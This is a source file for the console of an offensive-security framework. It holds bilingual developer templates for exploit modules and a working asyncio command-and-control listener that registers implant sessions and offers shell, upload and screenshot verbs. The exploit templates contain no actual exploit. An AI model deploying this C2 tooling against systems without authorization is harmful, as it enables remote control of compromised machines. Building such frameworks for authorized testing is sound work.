import ast
import os
import sys
import cmd
import copy
import threading
import time
import shlex
import traceback
import shutil
import glob
import getpass

try:
    import readline
    readline.set_completer_delims(' \t\n')
    readline.parse_and_bind("tab: complete")
except ImportError:
    pass

from pathlib import Path

from eidolon.colors import C, rl_prompt_safe, c
from eidolon.utils import (
    ok, err, info, warn, spectral, hr, print_banner, print_splash, print_table,
    _uptime_str, _fmt_duration, _cvss_severity, _cvss_color,
    _module_vulns, _module_cvss, version_tuple, sha256_of_path,
)
from eidolon.loader import (
    iter_module_files, load_module_from_path, _module_type, _cleanup_legacy_scaffolds,
    TrustManager,
    MODULE_TYPE_EXPLOIT, MODULE_TYPE_AUXILIARY, MODULE_TYPE_GENERIC,
    MODULE_TYPE_PAYLOAD, MODULE_TYPE_LISTENER, MODULE_TYPE_POST,
)
from eidolon.jobs import JobManager, invoke
from eidolon.database import EidolonDB
from eidolon.repo import RepositoryManager, encrypt_package
from eidolon import __version__, CODENAME

WORKSPACE_DIR = os.path.join(os.path.expanduser("~"), ".eidolon")
MODULES_DIR = os.path.join(WORKSPACE_DIR, "modules")
DB_PATH = os.path.join(WORKSPACE_DIR, "eidolon.db")

_version_tuple = version_tuple  # backwards-compat

_TYPE_COLOR = {
    MODULE_TYPE_AUXILIARY: "blue",
    MODULE_TYPE_GENERIC:   "gray",
    MODULE_TYPE_EXPLOIT:   "red",
    MODULE_TYPE_PAYLOAD:   "purple",
    MODULE_TYPE_POST:      "cyan",
}

_RANK_COLOR = {
    "excellent": C.GREEN, "great": C.GREEN, "good": C.LIME,
    "normal": C.WHITE, "average": C.YELLOW, "low": C.YELLOW,
    "manual": C.GRAY,
}


def _rank_str(rank):
    r = str(rank or "").strip().lower()
    return f"{_RANK_COLOR.get(r, C.WHITE)}{r}{C.RESET}" if r else ""


def _targets_str(targets):
    if not targets:
        return ""
    if isinstance(targets, str):
        return targets
    return ", ".join(str(t) for t in targets)

_TRUST_COLOR = {
    "ok":        C.GREEN,
    "untrusted": C.YELLOW,
    "modified":  C.RED,
    "missing":   C.GRAY,
    "unreadable": C.RED,
}

_MODULE_SCAFFOLDS = {
    "exploit": {
        "en": r'''"""
__NAME__ — EXPLOIT module — the complete zero-to-100 developer guide
=====================================================================

WHAT AN EXPLOIT IS HERE
  EXPLOIT = DELIVERY MECHANISM. Eidolon owns the chain up to the moment of
  execution; you own every line after that. Zero limits on style: memory
  corruption, deserialization, injection, auth bypass, logic bugs — the
  framework never judges and never mediates.

PART 1 — THE CONTRACT (the framework requires exactly two names)
  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
               - `set KEY value` fills them in the console; values are shown
                 by `options`.
               - required keys are validated automatically BEFORE run() runs.
               - optional extra keys: "kind": "payload" + "types": (...) for
                 a framework-managed payload field (see PART 3, step 4).
  * run(opts): receives {KEY: value}. Plain def or async def.
               Everything except OPTIONS+run is optional sugar.
  Optional hooks: on_load() (once at load, cheap + safe only) and stop()
  (`kill <id>` calls it — without it a long-running module is unkiltable).

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state across modules
  EIDOLON_SHELL     the live console instance (internal API — sparingly)
  __eidolon_path__  absolute path of this file (resolve siblings from it)

PART 3 — WRITING AN EXPLOIT FROM ZERO (the exact recipe)
  1. Keep the layout free: this entry script is the only file the scanner
     knows; put raw sources/tools next to it or in _src/ (dirs starting
     with "_" or "." stay invisible to the scanner). Resolve siblings from
     __eidolon_path__. Declare in ASSETS every file/dir install_local must
     ship next to the module — it copies exactly that, nothing else.
  2. Declare OPTIONS for every knob the operator must touch — and NOTHING
     else. Required keys are things without which a run is nonsense (e.g.
     target). Validate deeper invariants inside run() yourself: the
     framework checks presence, your bug's mechanics are YOUR business.
  3. Implement run(opts):
       - validate target/payload yourself (step 2 above);
       - every network call gets an explicit timeout — report failures via
         err(str(e)), never crash the console;
       - never eval/exec; filesystem access via whitelists + realpath.
  4. To receive a payload from the typed store, add to OPTIONS:
         "payload": {"value": "", "required": False, "desc": "…",
                     "kind": "payload",
                     "types": ("file-posix", "file-win", "shellcode", "cmd", "code")}
     `set payload <name-or-path>` then resolves LIVE against the store and
     run() receives a manifest DICT with "path" in it. Raw paths pass as
     type "external". Under the hood: eidolon.wraith.store.resolve_payload().
  5. PayLOAD FREEDOM — what you deliver is yours + operator's: raw file,
     shellcode, shell one-liner, generated source, multi-stage anything.
     The four classic shapes are ADVISORY PATTERNS, not a contract:
       SHELLCODE_PATH  arch/badchars/maxsize are YOUR bug's consequences
       PAYLOAD_FILE    compiled artifact dropped/uploaded on the target
       CMD             shell line (bash/zsh/cmd/…) — quoting is your business
       PAYLOAD_SRC     source an interpreter on the target executes
     Nothing is ever staged in temp copies: the operator gives absolute or
     relative paths, or a store name. Any C2 is legit: Sliver, a Wraith
     listener module, whatever comes next.
  6. (optional) After the break-in, hand the operator into your own shell:
         EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn,
                                      on_exit=fn)
     The completer gives FULL TAB COMPLETION inside; exploit sessions are
     auto-logged in the workspace DB.
  7. (optional) Advisory identity block: RANK (excellent > great > good >
     normal > average > low > manual), TARGETS (OS/arch/version ranges),
     REFERENCES (CVE ids, writeups). Displayed by `info`/repo views; never
     enforced.

PART 4 — THE OPERATOR FLOW (every console step, zero to 100)
      new_module myexp exploit      -> scaffold, UNTRUSTED (TOFU)
      trust myexp                   -> hash recorded
      use myexp                     -> shows OPTIONS
      set target <host>             -> required keys validated on run
      run                           -> the break-in (foreground)
  with a store payload:
      gen mybldr                    -> select a builder
      set …                         -> build-time params
      run                           -> registers the artifact, prints store path
      c2 payloads                   -> the store listing
      use myexp ; set payload mybldr-product ; run
  long-running exploits land as background jobs: `jobs` / `kill <id>`.
  after a foothold: post-exploit modules own recon/escalation; type `shell`
  to hand the operator into the selected module's interactive channel.

PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] every socket has an explicit timeout
  [ ] errors leave via err(str(e)) — the console never dies
  [ ] no eval/exec, no temp staging for artifacts
  [ ] required OPTIONS are minimal and meaningful
  [ ] shell crafted? completer covers every verb your payload speaks
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what breaking through this does"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "exploit"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "file"       # display-only: shellcode | file | cmd | code | none

OPTIONS = {
    "target": {
        "value":    "",
        "required": True,
        "desc":     "who this runs against (host, URL, or path)",
    },
    "payload": {
        "value":    "",
        "required": False,
        "desc":     "payload name from `c2 payloads`, or a raw file path",
        "kind":     "payload",            # framework-managed: validated on set
        "types":    ("file-posix", "file-win", "shellcode", "cmd", "code"),
    },
    "verbose": {
        "value":    False,
        "required": False,
        "desc":     "print every step",
    },
}


def run(opts):
    """THE entry point — opts = {KEY: value}; required keys already validated."""
    target  = opts.get("target", "")
    verbose = str(opts.get("verbose", "")).lower() in ("1", "true", "yes")

    info(f"__NAME__: engaging {target!r}")

    # -- 1. validate what YOUR bug requires (the framework cannot know) -----
    if not target:
        return err("target is empty — set it with: set target <value>")

    # -- 2. the payload field arrives as a manifest DICT ----------------------
    payload = opts.get("payload")
    if payload:
        artifact = payload["path"]                # ready to deliver
        if verbose:
            info(f"payload: {payload['name']} [{payload['type']}] at {artifact}")
    # else: deliver by CMD / PAYLOAD_SRC / whatever this exploit dreams up —
    # the four advisory channels in the docstring are patterns, not law.

    # -- 3. the actual break-in -----------------------------------------------
    try:
        # your exploit here — network calls with timeout, errors non-fatal
        pass
    except Exception as e:
        return err(f"failed: {e}")

    # -- 4. (optional) hand the operator into your own interactive shell ------
    # EIDOLON_SHELL.enter_subshell(self.on_line, completer=self.complete_line,
    #                              prompt_fn=lambda: "target> ",
    #                              on_exit=lambda: info("shell closed"))

    ok("__NAME__ finished (scaffold — no real operation yet)")
''',
        "fa": r'''"""
__NAME__ — ماژول EXPLOIT — راهنمای کامل صفر تا صد توسعه‌دهنده
=====================================================================

اکسپلویت در اینجا یعنی چه
  اکسپلویت فقط «وسيله‌ی تحويل» است. فریم‌ورک زنجيره را تا لحظه‌ی اجرا مصرف
  می‌کند؛ بقيه با توست. هيچ محدوديتی روی سبک نيست: خرابی حافظه، تزريق،
  دور‌زدن احراز هويت، باگ منطقی — فريم‌ورک داوری نمی‌کند و میانجی نمی‌شود.

بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
               - در کنسول با `set کلید مقدار` پر می‌شوند؛ `options` آنها را
                 نشان می‌دهد.
               - کلیدهای required قبل از اجرا شدن run() خودکار کنترل می‌شوند.
               - کلیدهای اضافی اختیاری: "kind": "payload" + "types": (…)
                 برای یک فیلد پیلودِ مدیریته‌شده (بخش ۳، گام ۴).
  * run(opts): {کلیدی: مقدار} می‌گیرد. def ساده یا async def.
  قلاب‌های اختیاری: on_load() (یک بار در لود، ارزان و بی‌خطر) و stop()
  ‏(`kill <id>` صدایش می‌زند — بدون آن ماژول طولانی‌مدت کشتنی نیست).

بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک بین ماژول‌ها
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)

بخش ۳ — نوشتن اکسپلویت از صفر، گام به گام
  ۱. چیدمان آزاد است: فقط همین اسکریپت ورودی را اسکنر می‌شناسد؛ سورس‌ها و
     ابزارها را کنارش یا در _src/ بگذار (پوشه‌هایی که با "_" یا "." شروع
     شوند برای اسکنر نامرئی‌اند). هم‌پوشه‌ها را از __eidolon_path__ حل کن.
     هر فایل/پوشه‌ای که install_local باید همراه ماژول بنشاند را در ASSETS
     اعلام کن — دقیقاً همان‌ها کپی می‌شوند، نه بیشتر.
  ۲. برای هر پیچی که اپراتور باید بچرخاند OPTIONS اعلام کن — و نه بیشتر.
     کلیدهای required فقط چیزهایی باشند که بدونشان اجرا بی‌معنی است
     (مثلاً target). فریم‌ورک فقط «بودن» را چک می‌کند؛ مکانیک باگِ توست،
     اعتبارسنجی عمیق را خودت داخل run() انجام بده.
  ۳. پیاده‌سازی run(opts):
       - target و پیلود را خودت اعتبارسنجی کن (گام ۲)؛
       - هر فراخوانی شبکه timeout صریح داشته باشد — خطا با err(str(e))
           برگردد، کنسول هرگز نباید بمیرد؛
       - هرگز eval/exec؛ دسترسی فایل فقط با وایت‌لیست + مهار realpath.
  ۴. برای رسیدن پیلود از انبارِ تایپ‌دار، در OPTIONS اضافه کن:
         "payload": {"value": "", "required": False, "desc": "…",
                     "kind": "payload",
                     "types": ("file-posix", "file-win", "shellcode", "cmd", "code")}
     سپس `set payload <نام-یا-مسیر>` همان لحظه روی انبار resolve می‌شود و
     run() یک مانیفست DICT با "path" دریافت می‌کند. مسیر خام با تایپ
     "external" می‌گذرد. زیرِ آن: eidolon.wraith.store.resolve_payload().
  ۵. آزادی پیلود — آنچه تحویل می‌شود تصمیم تو و اپراتور است: فایل خام،
     شل‌کد، خط فرمان، سورس تولیدی، دانلودر چندمرحله‌ای — هر چه بخواهی.
     چهار مدل کلاسیک فقط «الگوی مشورتی»‌اند، نه قرار داد:
       SHELLCODE_PATH  معماری/بدکاراکترها/سقف سایز برخاسته از باگِ «تو»ست
       PAYLOAD_FILE    آرتیفکت کامپایل‌شده که روی هدف گذاشته می‌شود
       CMD             خط شل (bash/zsh/cmd/…) — نقل‌قول‌ها با تو
       PAYLOAD_SRC     سورسی که مفسر روی هدف اجرایش می‌کند
     هیج‌وقت در پوشه‌های موقت stage نمی‌شود: مسیر مطلق/نسبی از اپراتور یا
     نام انبار. هر C2 مشروع است: Sliver، ماژول لیستنر Wraith، هرچه فردا.
  ۶. (اختیاری) بعد از ورود، کنسول را به شلِ خودت بسپار:
         EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn,
                                      on_exit=fn)
     کامپلیتر داخلش تب‌کامپلیت کامل می‌دهد؛ سشن‌های اکسپلویت در دیتابیسِ
     فضای کاری لاگ می‌شوند.
  ۷. (اختیاری) بلوک هویت مشورتی: RANK (مرتبه‌ی کیفیت)، TARGETS (سیستم/معماری/
     نسخه‌ی اعتبار)، REFERENCES (CVE، ویرایت‌آپ). فقط با `info`/repo نمایش
     داده می‌شوند؛ هرگز اجرایی نیستند.

بخش ۴ — جریان اپراتور (تمام دستورهای کنسول، صفر تا صد)
      new_module myexp exploit      <- اسکلت ساخته می‌شود، UNTRUSTED (TOFU)
      trust myexp                   <- هش ثبت می‌شود
      use myexp                     <- صفحه‌ی OPTIONS را نشان می‌دهد
      set target <host>             <- مقادیر لازم
      run                           <- ورود (پیش‌زمینه)
  با پیلودِ انبار:
      gen mybldr                    <- انتخاب بیلدر
      set …                         <- پارامترهای ساخت
      run                           <- آرتیفکت ثبت و مسیر انبار چاپ می‌شود
      c2 payloads                   <- فهرست انبار
      use myexp ؛ set payload <نام‌محصول> ؛ run
  اکسپلویت‌های طولانی‌مدت خودکار job پس‌زمینه می‌شوند: `jobs` / `kill <id>`.
  بعد از فوهولد: ماژول‌های post-exploit صاحب ریکون/ارتقایی‌اند؛ با `shell`
  اپراتور را وارد کانال تعاملی آن ماژول کن.

بخش ۵ — چک‌لیست پیش از اعلام «تمام»
  [ ] هر سوکت timeout صریح دارد
  [ ] خطاها با err(str(e)) خارج می‌شوند — کنسول نمی‌میرد
  [ ] eval/exec نیست، stage کردن در tmp نیست
  [ ] OPTIONS حداقلی و با‌معنا است
  [ ] شل داری؟ کامپلیتر هر فعلی را که پیلود می‌فهمد پوشش می‌دهد
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what breaking through this does"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "exploit"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "file"       # display-only: shellcode | file | cmd | code | none

OPTIONS = {
    "target": {
        "value":    "",
        "required": True,
        "desc":     "who this runs against (host, URL, or path)",
    },
    "payload": {
        "value":    "",
        "required": False,
        "desc":     "payload name from `c2 payloads`, or a raw file path",
        "kind":     "payload",            # framework-managed: validated on set
        "types":    ("file-posix", "file-win", "shellcode", "cmd", "code"),
    },
    "verbose": {
        "value":    False,
        "required": False,
        "desc":     "print every step",
    },
}


def run(opts):
    """THE entry point — opts = {KEY: value}; required keys already validated."""
    target  = opts.get("target", "")
    verbose = str(opts.get("verbose", "")).lower() in ("1", "true", "yes")

    info(f"__NAME__: engaging {target!r}")

    # -- 1. validate what YOUR bug requires (the framework cannot know) -----
    if not target:
        return err("target is empty — set it with: set target <value>")

    # -- 2. the payload field arrives as a manifest DICT ----------------------
    payload = opts.get("payload")
    if payload:
        artifact = payload["path"]                # ready to deliver
        if verbose:
            info(f"payload: {payload['name']} [{payload['type']}] at {artifact}")
    # else: deliver by CMD / PAYLOAD_SRC / whatever this exploit dreams up —
    # the four advisory channels in the docstring are patterns, not law.

    # -- 3. the actual break-in -----------------------------------------------
    try:
        # your exploit here — network calls with timeout, errors non-fatal
        pass
    except Exception as e:
        return err(f"failed: {e}")

    # -- 4. (optional) hand the operator into your own interactive shell ------
    # EIDOLON_SHELL.enter_subshell(self.on_line, completer=self.complete_line,
    #                              prompt_fn=lambda: "target> ",
    #                              on_exit=lambda: info("shell closed"))

    ok("__NAME__ finished (scaffold — no real operation yet)")
''',
    },
    "listener": {
        "en": r'''"""
__NAME__ — LISTENER module — the complete zero-to-100 developer guide
======================================================================

WHAT A LISTENER IS HERE
  A listener is 100% YOUR code: no framework listener, no transport, no
  wire contract around you. Choose any transport (TCP / WS / HTTP / UDP /
  gRPC ...), any wire format, any handshake. Shell, screenshot, upload,
  keys — the capability set is whatever YOU and the payload agree on.
  The kernel only offers the shelves (sessions + store) and never mediates.

PART 1 — THE CONTRACT (the framework requires exactly two names)
  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
               `set KEY value` fills them; required keys validated
               automatically BEFORE run() fires. host/port are the natural
               knobs; a port of 0 = let the OS pick a free one.
  * run(opts): plain def OR async def — BOTH first-class. async is the
               preferred style for servers: the framework runs the event
               loop for you, foreground or as a managed background job.
  * stop()   : optional but STRONGLY EXPECTED for listeners — `kill <id>`
               and shutdown call it; without it the job is unkiltable.
  Optional: on_load() (once at load — cheap + safe only).

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state
  EIDOLON_SHELL     the live console instance (internal API — sparingly)
  __eidolon_path__  absolute path of this file (resolve siblings)
  (keep module imports minimal; import inside run() what you really need)

PART 3 — WRITING A LISTENER FROM ZERO: THE FOUR MOVES
  MOVE 1 — SERVE
      Start your engine. Threaded engines (socket per thread) and async
      engines (asyncio) are both native; the full async version is below.
      A blocking-forever run() is CORRECT: listener-type runs are
      auto-backgrounded as managed jobs and `kill <id>` calls stop().
      Every knob (host/port/tls/token file ...) comes from OPTIONS.
      TLS is module business: terminate it yourself (ssl.SSLContext); the
      framework never touches your listener's sockets.
  MOVE 2 — PROFILE
      Publish the connection point so payload builders can embed it:
          EIDOLON_SHELL.wraith_listener = <obj with .url / .token / .tags>
      .url is where the implant dials (e.g. tcp://10.4.2.9:51515), .token
      is your shared secret material — the convention is entirely yours,
      the store merely carries it (see the payload scaffold: the builder
      bakes it into the artifact), .tags is a free-form tuple like
      ("ws-json-async",) meaning only what YOU agree. With port=0 read the
      ACTUAL bound port from the server object (shown below) — the url in
      the profile must be a real (host:port) pair, complete and dialable.
  MOVE 3 — SESSIONS (the only kernel call a connect needs)
      After your handshake (your framing: hello json / magic bytes / none):
          from eidolon.wraith.sessions import default_registry
          reg  = default_registry()                 # or a private one
          sess = reg.register({"sid": unique-id,     # required — from your hello
                               "implant": "my-implant",
                               "os": "linux", "arch": "x86_64",
                               "user": "alice", "host": "corp-ws",
                               "tags": TAGS}, addr=peer)
          EIDOLON_SHELL._c2_on_event(("up", sess))   # instant console notice
      The framework does nothing more: it registers, notifies, and lists
      (`c2 sessions`). The session object carries: sess.sid/.implant/.os/
      .arch/.user/.host/.status/.tags.
  MOVE 4 — INTERACT (the `use <sid>` handoff)
      sess.interact = callable(EIDOLON_SHELL) — when the operator types
      `use <sid>` the console calls it and takes your shell:
          def _enter(sh, sess, send):
              sh.enter_subshell(on_line=send,           # typed line -> implant
                                completer=_complete,    # FULL TAB COMPLETION
                                prompt_fn=lambda: "%.4s ❯ " % sess.sid,
                                on_exit=lambda: info("left session shell"))
      The inner shell normalizes NOTHING: every verb (shell / upload /
      screenshot / die ...) is your protocol. In async engines push the
      line into the event loop with call_soon_threadsafe (below); in
      threaded engines just close over the socket and send().

PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
      new_module mylsn listener ; trust mylsn ; use mylsn
      set port 51515 ; run              -> auto-backgrounded as a job
      jobs ; c2 sessions                -> the listener + sessions
      (implant dials...)                -> "payload connected" via _c2_on_event
      use <sid>                         -> YOUR subshell, tab completion included
      back                              -> console; channel stays live
      kill <id>                         -> stop() closes the server
  payload side: `gen <payload module>` reads EIDOLON_SHELL.wraith_listener
  (.url/.token/.tags) and bakes it into the artifact.

PART 5 — SAFETY/HOUSE RULES THAT ALSO APPLY TO LISTENERS
  * every network op has an explicit timeout; report str(err) via err().
  * artifacts with real keys are written 0o600; nothing in temp storage.
  * speak to the operator only through eidolon.utils
    (ok/err/info/warn/spectral).
  * never eval/exec; parse your wire format defensively (size caps).

PART 6 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] stop() closes every socket/loop — `kill <id>` really kills
  [ ] register() called once per implant, sid unique and stable
  [ ] sess.interact wired + _c2_on_event on "up" (and "down" on exit)
  [ ] profile published BEFORE any builder runs
  [ ] tab completion inside `use <sid>` reflects the real verb set
"""

import asyncio

from eidolon.utils import ok, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what this listener serves"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "listener"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module


OPTIONS = {
    "host": {"value": "0.0.0.0", "required": False, "desc": "bind address"},
    "port": {"value": 0,         "required": True,  "desc": "0 = auto-pick a free port"},
}

SERVER = None               # set by run(); stop() closes it
TAGS = ("__NAME__",)        # free labels — they mean only what YOU agree on


class _Profile:
    """Published for payload builders — any .url/.token/.tags object works."""

    def __init__(self, url, token, tags):
        self.url, self.token, self.tags = url, token, tags


def _complete(text, line):
    # MOVE 4 — FULL TAB COMPLETION inside `use <sid>`: YOUR words, your rules
    return [w for w in ("shell", "upload", "download", "screenshot", "ping", "die")
            if w.startswith(text)]


def _enter(sh, sess, send):
    # MOVE 4 — `use <sid>` lands here: your prompt, your commands, your completion
    sh.enter_subshell(on_line=send,
                      completer=_complete,
                      prompt_fn=lambda: "%.4s ❯ " % sess.sid,
                      on_exit=lambda: info("left the session shell"))


async def run(opts):
    global SERVER
    from eidolon.wraith.sessions import default_registry

    async def handle(reader, writer):
        peer = str(writer.get_extra_info("peername", "?"))
        loop = asyncio.get_running_loop()

        # MOVE 3 — a connect: YOUR framing decides what register() receives,
        # e.g. hello = json.loads((await asyncio.wait_for(reader.readline(), 10)).decode())
        reg = default_registry()
        sess = reg.register({"sid": peer.split(":")[-1],          # TODO: real implant id/hello
                             "implant": "unknown",
                             "os": "unknown", "arch": "unknown",
                             "user": "unknown", "host": "unknown",
                             "tags": TAGS}, addr=peer)

        async def send(line):
            writer.write((line + "\n").encode())
            try:
                await writer.drain()
            except Exception:
                pass

        sess.interact = lambda sh: _enter(
            sh, sess, lambda line: loop.call_soon_threadsafe(loop.create_task, send(line)))
        EIDOLON_SHELL._c2_on_event(("up", sess))          # instant console notice

    server = await asyncio.start_server(handle, opts.get("host", "0.0.0.0"),
                                        int(opts.get("port", 0) or 0))
    SERVER = server

    # MOVE 2 — publish the profile so payload builders read it
    EIDOLON_SHELL.wraith_listener = _Profile(
        "tcp://%s:%d" % server.sockets[0].getsockname()[:2], "", TAGS)

    # MOVE 1 — serve. Blocking forever is CORRECT here: a listener-module run()
    # is auto-backgrounded as a managed job; `kill <id>` calls stop().
    ok("__NAME__ serving on %s (async — native)" % str(server.sockets[0].getsockname()))
    info("build an implant: gen <payload module> · set · run")
    async with server:
        await server.serve_forever()


def stop():
    if SERVER is not None:
        try:
            SERVER.close()
        except Exception:
            pass
''',
        "fa": r'''"""
__NAME__ — ماژول LISTENER — راهنمای کامل صفر تا صد توسعه‌دهنده
======================================================================

لیستنر در اینجا یعنی چه
  لیستنر ۱۰۰٪ کدِ خود توست: نه لیستنر فریم‌ورکی دارد، نه ترنسپورت، نه
  قرارداد سیمیِ از پیش تعیین‌شده. هر ترنسپورتی (TCP / WS / HTTP / UDP /
  gRPC …)، هر قالب سیمی، هر دست‌دادن. شل، اسکرین‌شات، آپلود، کلیدها —
  مجموعه‌ی قابلیت‌ها دقیقاً توافقی است که «تو و پیلود» می‌کنید. هسته فقط
  قفسه‌ها را می‌دهد (sessions + store) و هرگز میانجی نمی‌شود.

بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
               اجرای run() خودکار کنترل می‌شوند. host/port طبیعی‌ترین
               پیچ‌ها هستند؛ port = 0 یعنی سیستم‌عامل یک پورت آزاد بدهد.
  * run(opts): def ساده یا async def — هر دو درجه‌یک. برای سرورها async
               سبک مرجح است: فریم‌ورک خودش حلقه‌ی رویداد را بالا می‌آورد،
               پیش‌زمینه یا به‌صورت job مدیریت‌شده.
  * stop()   : برای لیستنرها اختیاری ولی قویاً انتظار می‌رود — `kill <id>`
               و خاموشی آن را صدا می‌زنند؛ بدون آن job کشتنی نیست.
  اختیاری: on_load() (یک بار در زمان لود — فقط ارزان و بی‌خطر).

بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
  opts              {کلید: مقدار} — مقادیر حل‌شده
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
  __eidolon_path__  مسیر مطلق همین فایل
  (import های ماژول را کم نگه دار؛ هرچه لازم داری داخل run() بیاور.)

بخش ۳ — نوشتن لیستنر از صفر: چهار حرکت
  حرکت ۱ — SERVE
      موتور را روشن کن. موتور هم‌زمان (سوکت + ریسمان) و موتور async
      (asyncio) هر دو بومی‌اند؛ نسخه‌ی کامل async پایین آمده.
      run() بلوک‌شونده تا ابد اینجا درست است: اجرای ماژول لیسنر خودکار
      به job مدیریت‌شده پس‌زمینه می‌رود و `kill <id>` صدا می‌زند stop().
      هر پیچی (host/port/tls/فایل توکن …) از OPTIONS می‌آید.
      TLS کار خود ماژول است: خودت ترمینالش کن (ssl.SSLContext)؛ فریم‌ورک
      دست به سوکت‌های تو نمی‌زند.
  حرکت ۲ — PROFILE
      نقطه‌ی اتصال را منتشر کن تا بیلدرهای پیلود در آرتیفکت جاسازی کنند:
          EIDOLON_SHELL.wraith_listener = <شی با .url / .token / .tags>
      .url جایی است که ایمپلنت شماره می‌گیرد (مثلاً tcp://10.4.2.9:51515)،
      .token ماده‌ی رازِ مشترک توست — قراردادش کاملاً دست آزاد توست و انبار
      فقط حملش می‌کند (اسکلت پیلود را ببین: بیلدر آن را در آرتیفکت
      جاسازی می‌کند)، .tags تاپلِ آزاد است مثل ("ws-json-async",) که
      «فقط همان معنایی را می‌دهد که تو قبول کردی». با port=0 پورت واقعیِ
      bind را از خود شی سرور بخوان (پایین نشان داده شده) — url پروفایل
      باید جفت (host:port) واقعی و کامل و شماره‌گرفتنی باشد.
  حرکت ۳ — SESSIONS (تنها فراخوانی هسته که یک اتصال لازم دارد)
      بعد از دست‌دادنِ خودت (قالب‌بندی سیمی مالِ توست: hello json/جادویی/هیچ):
          from eidolon.wraith.sessions import default_registry
          reg  = default_registry()                 # یا یکی خصوصی
          sess = reg.register({"sid": شناسه-یکتا,     # لازم — از hello خودت
                               "implant": "my-implant",
                               "os": "linux", "arch": "x86_64",
                               "user": "alice", "host": "corp-ws",
                               "tags": TAGS}, addr=peer)
          EIDOLON_SHELL._c2_on_event(("up", sess))   # اعلام فوری در کنسول
      فریم‌ورک بیش از این کاری نمی‌کند: ثبت، خبر دادن، فهرست (`c2 sessions`).
      شی سشن دارد: sess.sid/.implant/.os/.arch/.user/.host/.status/.tags.
  حرکت ۴ — INTERACT (دست به دست شدن با `use <sid>`)
      sess.interact = تابع(EIDOLON_SHELL) — اپراتور که تایپ کند `use <sid>`
      کنسول آن را صدا می‌زند و شلِ تو را تحویل می‌گیرد:
          def _enter(sh, sess, send):
              sh.enter_subshell(on_line=send,       # خط تایپ‌شده به پیلود
                                completer=_complete,     # تب‌کامپلیت کامل
                                prompt_fn=lambda: "%.4s ❯ " % sess.sid,
                                on_exit=lambda: info("از شل سشن خارج شد"))
      شل داخلی هیچ‌چیز را نرمال‌لایز نمی‌کند: هر فعل (shell / upload /
      screenshot / die …) پروتکلِ توست. در موتورهای async خط را با
      call_soon_threadsafe به حلقه‌ی رویداد تزریق کن (پایین آمده)؛ در
      موتورهای thread-محور فقط سوکت را در تابع ببند و send() کن.

بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
      new_module mylsn listener ؛ trust mylsn ؛ use mylsn
      set port 51515 ؛ run              <- خودکار به job می‌رود
      jobs ؛ c2 sessions                <- لیستنر + سشن‌ها
      (ایمپلنت شماره می‌گیرد…)          <- «payload connected» از _c2_on_event
      use <sid>                         <- ساب‌شل خودت، با تب‌کامپلیت
      back                              <- کنسول؛ کانال زنده می‌ماند
      kill <id>                         <- stop() سرور را می‌بندد
  سمت پیلود: `gen <ماژول پیلود>` خوانش EIDOLON_SHELL.wraith_listener
  (.url/.token/.tags) و جاسازی‌اش در آرتیفکت.

بخش ۵ — قوانین ایمنی/خانه که برای لیستنر هم برقرارند
  * هر عملیات شبکه timeout صریح دارد؛ گزارش خطا با err(str(e)).
  * آرتیفکت حاوی کلید واقعی با 0o600 نوشته می‌شود؛ هیچ چیز در tmp نیست.
  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn/spectral).
